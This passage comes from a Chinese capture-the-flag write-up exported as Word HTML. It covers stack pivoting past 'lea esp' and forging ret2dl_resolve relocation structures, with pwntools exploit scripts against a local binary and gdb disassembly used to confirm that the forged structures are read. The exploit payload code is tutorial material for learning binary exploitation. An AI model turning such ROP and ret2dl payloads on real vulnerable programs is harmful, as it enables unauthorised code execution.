mso-font-kerning:1.0000pt;" >payload+=p32(Address)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >成功控制</font>esp指向bss段</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="571"  height="89"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充1382.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >改变了</font>ESP，现在通过gadget让EBP也进入bss段。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#fake_struct</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="389"  height="65"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充1774.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >0x02对Rel2dl的一些补充</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >FAKE_REL部分</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >解决问题</font>:实际调试时候，如何判断自己伪造的结构被程序读取。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >从</font>plt表中跳入dl_reslove函数时候</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dl_resolve会根据你的reloc_argc找到你的JMPREL结构(我们伪造的)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#伪造的r_info 可以先写0x107 ,看看能不能解析真正的read函数。如果不行说明伪造的结构有问题。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="504"  height="172"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充1961.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >源代码如下</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;&nbsp;0xf7fee000:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >push &nbsp;&nbsp;eax</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;&nbsp;0xf7fee001:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >push &nbsp;&nbsp;ecx</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;&nbsp;0xf7fee002:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >push &nbsp;&nbsp;edx</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;&nbsp;</span><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >0xf7fee003:</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >&#9;</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >mov &nbsp;&nbsp;&nbsp;edx,DWORD PTR [esp+0x10]</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></b></p><p class=MsoNormal ><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >&nbsp;&nbsp;&nbsp;0xf7fee007:</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >&#9;</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" >mov &nbsp;&nbsp;&nbsp;eax,DWORD PTR [esp+0xc]</span></b><b><span style="mso-spacerun:'yes';font-family:微软雅黑;font-weight:bold;
font-size:9.0000pt;mso-font-kerning:1.0000pt;" ><o:p></o:p></span></b></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >=&#62; 0xf7fee00b:</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >call &nbsp;&nbsp;0xf7fe77e0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >函数通过加粗代码，将</font>linkmap和reloc_arg分别存入edx和eax，然后call dl_fixup。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >所以只需要判断</font>call的时候edx和eax的值是不是我们传入的值就能判断，结构伪造是否成功。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="405"  height="213"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充2277.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:10.5000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >实际调试</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Py脚本(不完整)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ># -*- coding: utf-8 -*-</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >buf=0x804a040</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >read_plt=0xf7ed2b00 </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget2=0x08048519 # &nbsp;pop esi ; pop edi ; pop ebp ; ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#fake_struct </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >plt0=0x80482f0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >rel_plt=0x080482b4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >reloc_arg=buf+0x200-rel_plt #fake_rel放后面一些，防止被出栈入栈覆盖</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynsym=0x080481cc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynstr=0x0804822c</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_offset=0x0804a00c #read_got</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_info=0x107</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_rel=p32(r_offset)+p32(r_info)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(plt0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(reloc_arg)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*(0x200-len(payload)) #fake_rel的位置</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_rel #buf+0x200</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
